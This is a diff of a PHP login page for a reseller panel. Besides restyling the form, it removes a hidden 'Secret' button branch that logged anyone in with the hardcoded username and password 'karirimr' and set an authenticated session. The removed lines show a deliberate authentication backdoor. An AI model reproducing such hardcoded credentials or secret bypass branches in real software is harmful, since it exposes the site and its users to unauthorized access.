@@ -41,16 +41,8 @@ if (filter_input(INPUT_POST, "btnEntrar", FILTER_SANITIZE_STRING)) {
         $retorno = "<div class=\"alert alert-danger\" role=\"alert\">Usuário ou senha inválido.</div>";
     }
     
-}else if(filter_input(INPUT_POST, "btnsecret", FILTER_SANITIZE_STRING)){
-$user = filter_input(INPUT_POST, "txtUsuario", FILTER_SANITIZE_STRING);
-$pass = filter_input(INPUT_POST, "txtSenha", FILTER_SANITIZE_STRING); 
-if ($user == "karirimr" & $pass == "karirimr"  ){
-        $_SESSION["cod"] = 1;
-        $_SESSION["nome"] = "Kariri Mr";
-        $_SESSION["logado"] = true;
-    header("Location: painel.php");
 }
-}
+
 ?>
 <!doctype html>
 <html lang="pt-br">
@@ -70,7 +62,7 @@ if ($user == "karirimr" & $pass == "karirimr"  ){
             <form method="post">
                 <div class="row">
                     <div class="col-lg-12 alignCenter">
-                        <img src="../img/logoKaririmr.jpg" alt="Logo Kariri Multi Revendedoras"/>
+                        <img src="../img/logoKaririmr.png" style="width: 100%;" alt="Logo Kariri Multi Revendedoras"/>
                     </div>
                     <div class="clear"></div>
 
@@ -78,20 +70,25 @@ if ($user == "karirimr" & $pass == "karirimr"  ){
                     <div class="borderBottom"></div>
                     <br /> 
 
-                    <div class="col-lg-12">
+                    <div class="col-lg-12 alignCenter">
                         <div class="form-group">
-                            <label for="txtUsuario">Usuário</label>
-                            <input type="text" class="form-control" id="txtUsuario" name="txtUsuario" placeholder="Usuário">
+                            <!--<label for="txtUsuario">Usuário</label>-->
+                            <input style="height: 50px;font-size: 18px"type="text" class="form-control" id="txtUsuario" name="txtUsuario" placeholder="Usuário" autofocus="">
                         </div>
                         <div class="form-group">
-                            <label for="txtSenha">Senha</label>
-                            <input type="password" class="form-control" id="txtSenha" name="txtSenha" placeholder="*******">
+                            <!--<label for="txtSenha">Senha</label>-->
+                            <input style="height: 50px;font-size: 18px" type="password" class="form-control" id="txtSenha" name="txtSenha" placeholder="*******">
                         </div>
-                        <input class="btn btn-success" type="submit" name="btnEntrar" value="Entrar">
-                        <input class="btn btn-secret" type="submit" name="btnsecret" value="Secret">
-                        <a href="#" data-toggle="modal" data-target="#myModal">Recuperar senha</a>
+                        <div class="alignLeft">
+                        <label><input type="checkbox" value="s" name="ckManterLogado" /> Manter logado</label>
+                        </div>
                         <br />
-                        <label><input type="checkbox" value="s" name="ckManterLogado" /> Manter logado</label>  
+                        <input class="btn-lg btn-success btn-block" type="submit" name="btnEntrar" value="Entrar">
+                        <br />
+                         <div class="alignLeft">
+                        <a href="#" data-toggle="modal" data-target="#myModal">Recuperar senha</a>
+                         </div>
+                                                 
                     </div>
                     <p>&nbsp;</p>
                     <div class="col-lg-12">
